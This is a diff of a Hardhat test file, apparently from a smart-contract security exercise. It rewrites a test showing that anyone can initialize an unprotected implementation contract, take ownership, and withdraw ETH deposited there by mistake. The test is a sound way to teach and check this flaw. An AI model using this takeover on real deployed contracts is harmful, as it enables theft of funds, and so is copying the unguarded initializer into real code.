@@ -35,14 +35,21 @@ describe("04 - Initialize", function () {
       );
     });
 
-    it("attack: anyone can initialize the implementation directly", async function () {
-      const { attacker, implementation } = await networkHelpers.loadFixture(deployFixture);
+    it("attack: anyone can initialize the implementation and withdraw what was sent to it", async function () {
+      const { alice, attacker, implementation } = await networkHelpers.loadFixture(deployFixture);
+      // Someone deposits into the implementation address by mistake (e.g. a misconfigured front-end).
+      await implementation.connect(alice).deposit({ value: 1000n });
 
       await implementation.connect(attacker).initialize(attacker.address);
 
-      // This is BUG 4: the attacker owns the implementation. Harmless here, but in a
-      // UUPS implementation the owner can call upgradeToAndCall on it (pre-Cancun: selfdestruct it).
+      // This is BUG 4: the attacker owns the implementation and takes the ETH sent to it.
       expect(await implementation.owner()).to.equal(attacker.address);
+      await expect(implementation.connect(attacker).withdraw()).to.changeEtherBalances(
+        ethers,
+        [attacker, implementation],
+        [1000n, -1000n],
+      );
+      expect(await implementation.totalDeposits()).to.equal(0n);
     });
   });
 
